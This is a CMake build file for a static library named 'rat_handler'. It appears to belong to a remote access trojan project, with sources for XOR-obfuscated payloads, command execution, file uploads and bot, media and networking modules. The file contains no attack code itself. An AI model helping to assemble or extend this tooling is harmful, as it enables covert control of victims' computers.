set(SRC_DIR ${CMAKE_CURRENT_SOURCE_DIR}/src)

set(HANDLER_SRC
	${SRC_DIR}/handleXoredPayload.cpp
	${SRC_DIR}/init.cpp
    ${SRC_DIR}/handleUpdate.cpp
    ${SRC_DIR}/handlers.cpp
	${SRC_DIR}/handleRunCommand.cpp
    ${SRC_DIR}/handleHelpCommand.cpp
    ${SRC_DIR}/networking_handlers.cpp
    ${SRC_DIR}/filesystem_handlers.cpp
    ${SRC_DIR}/handleUploadedFiles.cpp
    ${SRC_DIR}/helpers.cpp
    ${SRC_DIR}/RatState.cpp
    ${SRC_DIR}/threaded_handlers.cpp
)

add_library(rat_handler STATIC ${HANDLER_SRC})

target_include_directories(rat_handler
    PUBLIC
        ${CMAKE_CURRENT_SOURCE_DIR}/include
)

target_link_libraries(rat_handler
    PUBLIC
		TINY_PROCESS_LIBRARY::tiny-process-library
		stdc++fs
        rat_compression
		rat_encryption
        rat_networking
        rat_threading
        rat_tbot
        rat_system
        rat_media
)
if (DEBUG_RAT_HANDLER)
	target_compile_definitions(rat_handler PUBLIC DEBUG_RAT_HANDLER)
    target_link_libraries(rat_handler PUBLIC spdlog::spdlog)
endif()
